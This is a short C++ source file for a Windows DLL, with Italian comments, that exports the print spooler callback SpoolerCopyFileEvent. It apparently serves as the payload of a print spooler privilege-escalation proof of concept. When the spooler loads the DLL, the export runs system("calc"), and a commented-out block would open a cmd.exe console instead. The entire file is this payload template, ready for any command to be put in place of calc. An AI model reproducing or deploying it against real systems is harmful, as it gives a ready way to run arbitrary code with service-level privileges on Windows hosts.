// dllmain.cpp : Definisce il punto di ingresso per l'applicazione DLL.
#include "pch.h"

#include<stdlib.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

BOOL _cdecl SpoolerCopyFileEvent(
    _In_ LPWSTR pszPrinterName,
    _In_ LPWSTR pszKey,
    _In_ DWORD dwCopyFileEvent
) {
    /*STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    LPTSTR cmdPath = const_cast<wchar_t*>(L"C:\\Windows\\System32\\cmd.exe");

    if (!CreateProcess(cmdPath, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        return TRUE;
    }

    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE; */ 
    system("calc"); 
    return TRUE; 
}

